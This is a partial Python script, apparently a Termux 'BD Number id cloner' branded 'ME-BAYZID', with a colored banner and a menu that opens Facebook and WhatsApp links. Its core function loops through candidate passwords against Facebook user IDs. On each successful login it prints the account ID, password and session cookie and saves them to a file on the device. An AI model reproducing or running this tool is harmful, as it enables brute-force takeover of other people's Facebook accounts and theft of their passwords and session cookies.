...
██║ ╚═╝ ██║███████╗    ██████╔╝██║  ██║   ██║   ███████╗██║██████╔╝
╚═╝     ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝╚═════╝                                                                   
       \033[1;93m ╔══════════════════[\033[1;32m𝐀𝐃𝐌𝐈𝐍 𝐈𝐍𝐅𝐑𝐎\033[1;32m]════════════════╗
        \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m BAYZID AHMMED  XR     \033[1;93m║
        \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m X A Y Z I D       \033[1;93m║
        \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mBAYZID 90         \033[1;93m ║
        \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;33m𝐌𝐄𝐍𝐓𝐀𝐋 𝐆𝐀𝐍𝐆 71       \033[1;93m ║
        ...
        \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m BAYZID TERMUX COMMEND ZONE....           \033[1;93m ║
       \033[1;93m ╚═════════════════[\033[1;32m 𝐌𝐄-BAYZID \033[1;32m]══════════════════╝""")
...
def Main():
	...
	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN PABLIC GROUP")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100077709764550&mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://www.facebook.com/groups/816100792588712/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/mantalpeace');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100028435809999');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://chat.whatsapp.com/Eep80rMQxCQGOHDUq6uUky');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	kode = input(' ┗━[+] SELECT : ')
	doamin = ' BD Number id cloner [𝐌𝐄-BAYZID-OK] '
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐌𝐄-BAYZID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [𝐌𝐄-BAYZID-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/𝐌𝐄-BAYZID.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
